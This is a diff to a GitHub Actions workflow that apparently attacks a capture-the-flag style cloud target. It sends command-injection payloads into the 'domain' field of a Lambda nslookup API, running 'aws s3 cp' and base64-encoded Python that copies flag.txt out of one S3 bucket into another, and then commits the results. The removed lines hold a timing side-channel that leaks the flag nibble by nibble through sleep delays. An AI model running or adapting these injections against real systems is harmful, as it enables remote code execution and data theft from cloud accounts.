@@ -25,89 +25,51 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Extract nibbles + calibrate + verify inline
+      - name: Direct exfiltration via Lambda injection
         run: |
           URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          DEST="s3://platform-bucket-009661764077-us-east-1/flag-direct.txt"
 
-          run_timed() {
-            local label=$1
-            local b64=$2
-            local INJ="x; echo $b64 | base64 -d | python3 #"
-            local t0=$(date +%s%3N)
-            curl -s -X POST "$URL" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
-            local t1=$(date +%s%3N)
-            local dt=$((t1-t0))
-            echo "$label ${dt}ms"
-            echo "$label ${dt}ms" >> nibbles3.txt
-          }
+          echo "=== Attempt 1: aws s3 cp direct ==="
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt '"$DEST"' #"}'
+          sleep 3
+          aws s3 cp "$DEST" - 2>&1 && echo "" || echo "File not found via cicdRole"
 
-          echo "# extraction run $(date -u)" > nibbles3.txt
+          echo "=== Attempt 2: Python boto3 PutObject ==="
+          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag-py.txt',Body=flag);print('Wrote',len(flag),'bytes')"
+          B64=$(echo -n "$PY" | base64 -w0)
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}"
+          sleep 3
+          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag-py.txt" - 2>&1 && echo "" || echo "flag-py.txt not found"
 
-          # Extract hi nibbles: sleep = flag[i] >> 4
-          for i in $(seq 0 15); do
-            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]>>4)"
-            run_timed "hi${i}" "$(echo -n "$PY" | base64 -w0)"
-          done
+          echo "=== Attempt 3: Base64 encode and write to public bucket ==="
+          PY2="import boto3,base64;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();b64=base64.b64encode(flag).decode();s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag-b64.txt',Body=b64.encode())"
+          B64_2=$(echo -n "$PY2" | base64 -w0)
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"domain\":\"x; echo $B64_2 | base64 -d | python3 #\"}"
+          sleep 3
+          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag-b64.txt" - 2>&1 && echo "" || echo "flag-b64.txt not found"
 
-          # Extract lo nibbles: sleep = flag[i] & 0xF
-          for i in $(seq 0 15); do
-            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]&0xF)"
-            run_timed "lo${i}" "$(echo -n "$PY" | base64 -w0)"
-          done
-
-          # Calibration: sleep=0 (Lambda is warm after 32 calls)
-          # This gives pure overhead (S3 read + subprocess, no sleep)
-          CAL_PY="import boto3,time;boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(0)"
-          run_timed "cal_sleep0" "$(echo -n "$CAL_PY" | base64 -w0)"
-          run_timed "cal_sleep0_2" "$(echo -n "$CAL_PY" | base64 -w0)"
-
-          # Analyze locally using cal_sleep0 as overhead reference
-          ANALYSIS=$(python3 -c "
-          timings = {}
-          for line in open('nibbles3.txt'):
-              p = line.strip().split()
-              if len(p) == 2:
-                  timings[p[0]] = int(p[1].replace('ms',''))
-
-          # Use warm calibration as overhead
-          c1 = timings.get('cal_sleep0', 2000)
-          c2 = timings.get('cal_sleep0_2', 2000)
-          overhead = (c1 + c2) / 2
-
-          # Compute nibbles and flag bytes
-          flag_bytes = []
-          for i in range(16):
-              hi_ms = timings.get('hi'+str(i), overhead)
-              lo_ms = timings.get('lo'+str(i), overhead)
-              hi = max(0, min(15, round((hi_ms - overhead) / 1000)))
-              lo = max(0, min(15, round((lo_ms - overhead) / 1000)))
-              flag_bytes.append((hi << 4) | lo)
-
-          flag_hex = ''.join('{:02x}'.format(b) for b in flag_bytes)
-          flag_ascii = ''.join(chr(b) if 32<=b<=126 else '.' for b in flag_bytes)
-          print('OVERHEAD=' + str(round(overhead)))
-          print('FLAG_HEX=' + flag_hex)
-          print('FLAG_ASCII=' + flag_ascii)
-          ")
-          echo "$ANALYSIS"
-
-          FLAG_HEX=$(echo "$ANALYSIS" | grep FLAG_HEX | cut -d= -f2)
-          FLAG_ASCII=$(echo "$ANALYSIS" | grep FLAG_ASCII | cut -d= -f2)
-          echo "Computed flag: $FLAG_ASCII ($FLAG_HEX)"
-
-          # Immediately verify the computed flag
-          PY_CMP="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(10 if flag==bytes.fromhex('${FLAG_HEX}') else 2)"
-          B64_CMP=$(echo -n "$PY_CMP" | base64 -w0)
-
-          echo "# verify run $(date -u)" > verify3.txt
-          echo "FLAG_HEX=$FLAG_HEX" >> verify3.txt
-          echo "FLAG_ASCII=$FLAG_ASCII" >> verify3.txt
-          run_timed "verify" "$B64_CMP"
-
-      - name: Commit results
+      - name: Save and commit exfil results
         run: |
+          echo "=== checking platform bucket ===" > exfil.txt
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ 2>&1 | grep -E "flag|exfil" >> exfil.txt || true
+
+          # Try reading all potential flag files
+          for key in flag-direct.txt flag-py.txt flag-b64.txt exfil-flag.txt; do
+            echo "--- $key ---" >> exfil.txt
+            aws s3 cp "s3://platform-bucket-009661764077-us-east-1/$key" - 2>&1 >> exfil.txt || true
+          done
+
+          cat exfil.txt
+
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
-          git add nibbles3.txt verify3.txt
-          git commit -m "re-extract v3 + warm calibration + inline verify" || echo "Nothing to commit"
+          git add exfil.txt
+          git commit -m "direct exfil attempt" || echo "Nothing to commit"
           git push origin corgi
